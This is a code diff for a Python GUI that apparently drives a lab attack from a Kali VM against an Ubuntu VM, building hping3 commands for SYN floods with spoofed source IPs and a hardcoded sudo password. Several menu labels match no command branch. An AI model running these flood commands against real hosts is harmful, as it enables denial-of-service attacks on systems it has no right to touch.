@@ -103,7 +103,7 @@ class VMGUI:
 
         ttk.Label(self.master, text="Select Attack Type", font=("Arial", 14)).pack(pady=20)
 
-        attacks = ["SYN Flood", "UDP Flood", "ICMP Flood"]
+        attacks = ["Spoof Packet", "Dos", "Payload"]
         for atk in attacks:
             ttk.Radiobutton(self.master, text=atk, value=atk, variable=self.attack_type).pack(anchor='w')
 
@@ -142,13 +142,15 @@ class VMGUI:
         self.attack_running = True
         threading.Thread(target=self._monitor_attack, args=(), daemon=True).start()
         port = 80
-        packet_count = 100
+        packet_count = 1000
+        fake_ip = "10.10.10.4"
+        fake_ip2 = "10.11.12.2"
         if atk == "SYN Flood":
             cmd = f"echo kali | sudo -S hping3 -S -c {packet_count} -p {port} {ubuntu_ip}"
-        elif atk == "UDP Flood":
-            cmd = f"echo kali | sudo -S hping3 --udp -c {packet_count} -p {port} {ubuntu_ip}"
-        elif atk == "ICMP Flood":
-            cmd = f"echo kali | sudo -S hping3 --icmp -c {packet_count} {ubuntu_ip}"
+        elif atk == "Dos":
+            cmd = f"echo kali | sudo -S hping3 -S -p {port} -a {fake_ip} -i u{packet_count} {ubuntu_ip}"
+        elif atk == "ttl":
+            cmd = f"echo kali | sudo -S hping3 -S -p {port} -a {fake_ip2} {ubuntu_ip} --ttl 200 -c 10"
         else:
             messagebox.showerror("Unknown Attack", "Invalid attack selected.")
             self.attack_running = False
